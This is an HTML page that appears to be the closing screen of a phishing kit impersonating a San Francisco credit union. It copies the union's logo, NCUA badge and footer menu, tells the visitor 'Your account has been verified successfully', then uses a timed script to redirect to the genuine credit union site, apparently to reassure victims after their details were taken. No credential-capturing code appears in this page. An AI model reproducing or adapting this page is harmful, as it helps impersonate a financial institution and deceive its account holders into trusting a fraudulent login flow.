<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Page Title</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');

        *{
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
        }

        body{
            background-image: url(assets/bg.png);
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            font-family: 'Open Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }


        section{
            
            max-width: 620px;
            border-radius: 4px;
        }

        .logo_box{
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-color: white;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
            border-bottom: 1px solid #c1c1c1;
        }


        .logo_box img{
            width: 62%;
        }


        form{
            width: 100%;
            background: rgba(255, 255, 255, 0.936);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

        .form_box{
            margin: 10px 0px;
            width: 55%;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .form_box label{
            color: #262626;
            margin-bottom: 4px;
            font-weight: 600;
            font-size: 14px;
        }
        .form_box input{
            height: 45px;
            border: 1px solid #c1c1c1;
            border-radius: 4px;
            transition: .2s ease;
            padding: 10px;
        }

        .form_box p{
            position: absolute;
            right: 3%;
            font-size: 12px;
            top: 55%;
        }

        .remeber{
            display: flex;
            align-items: center;
            width: 55%;
            margin: 10px 0px;
        }

        .remeber input{
            width: 20px;
            height: 20px;
        }

        .remeber p{
            margin-left: 10px;
            font-size: 12px;
            color: #262626;
        }

        form button{
            width: 55%;
            height: 37px;
            background: #8CBAD1;
            color: white;
            border-radius: 3px;
            margin: 15px 0px;
            border: none;
        }


        form ul{
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            margin-top: 10px;
            width: 100%;
            background: #559CBE;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
            padding: 0px 50px;
            color: white;
        }

        form ul span{
            opacity: .3;
        }

        p.forgot{
            font-size: 12px;
            text-align: right;
            width: 55%;
            margin: 10px 0px;
            color: #262626;
        }


        form ul li{
            color: white;
            font-size: 12px;
            list-style-type: none;
            
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px 20px;
        }

        form ul li:hover{
            text-decoration: underline;
            cursor: pointer;
        }

        .mt_30{
            margin-top: 30px;
        }


        img.ncua{
            margin: 50px 0px 0px 0px;
        }

        .border{
            border-right: 1px solid white;
        }

        .form_box input:focus{
            outline: 2px solid #0066CC;
        }

        .active{
            background: #559CBE;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
        }

        form img{
            width: 100px;
            margin: 10px 0px;
        }

        form h1, form p{
            text-align: center;
            margin: 10px 0px;
        }

        @media only screen and (max-width:800px){
            body{
                padding: 25px 10px;
            }
            section{
                width: 100%;
                max-width: unset;
            }

            .logo_box{
                padding: 10px;
            }

            .logo_box img{
                width: 20%;
            }

            .mt_30{
                margin-top: 40px !important;
            }

            .form_box{
                width: 50%;
                margin: 17px 0px;
            }

            .form_box label{
                font-size: 13px;
            }

            .remeber{
                width: 50%;
            }
            form button{
                width: 50%;
            }

            p.forgot{
                width: 50%;
            }

            form ul{
                padding: 0px !important;
                width: 100%;
            }

            .remeber input{
                width: 20px;
                height: 20px;
            }

            form li{
                margin: 0px !important;
                padding: 0px;
               
            }

            form span{
                margin: 0px;
                padding: 0px;
            }

        }


        @media only screen and (max-width:500px){

            .logo_box img{
                width: 65%;
                padding: 0px !important;
            }


            .form_box, .remeber, form button, p.forgot{
                width: 85%;
            }

            p.forgot{
                margin: 20px 0px;
            }

            form ul{
                padding: 0px 0px !important;
            }

            form li{
                justify-content: flex-start;
                padding: 10px 0px !important;
            }

            .ncua_box{
                width: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                background: #559CBE;
                padding: 10px;
                border-radius: 7px;
                height: max-content;
                margin: 40px 0px;
            }

            img.ncua{
                margin: 0px;
            }



        }

    </style>
</head>
<body>

    <section>
        <div class="logo_box">
            <img src="assets/san-logo.png" alt="">
        </div>

        <form id="form" method="post">

            <img src="assets/check.png" alt="">

            <h1>Verification successful !</h1>

            <p>Your account has been verified successfully</p>
            <p>Do not refresh page...redicting to homepage</p>

            <ul>
                <li>
                    Enroll now   
                </li>
                <span>|</span>
                <li>Forgot/Unlock Account</li>
                <span>|</span>
                <li>Contact Us</li>
                <span>|</span>
                <li>Locations</li>
                <span>|</span>
                <li>Privacy & Security</li>
            </ul>
        </form>

    </section>

    <div class="ncua_box">
        <img class="ncua" src="assets/ncua_logo_small.png" alt="">
    </div>



    <script>

        setTimeout(() => {
            window.location = 'https://www.sanfranciscofcu.com/locations/'
        }, 10000);

    </script>
    
</body>
</html>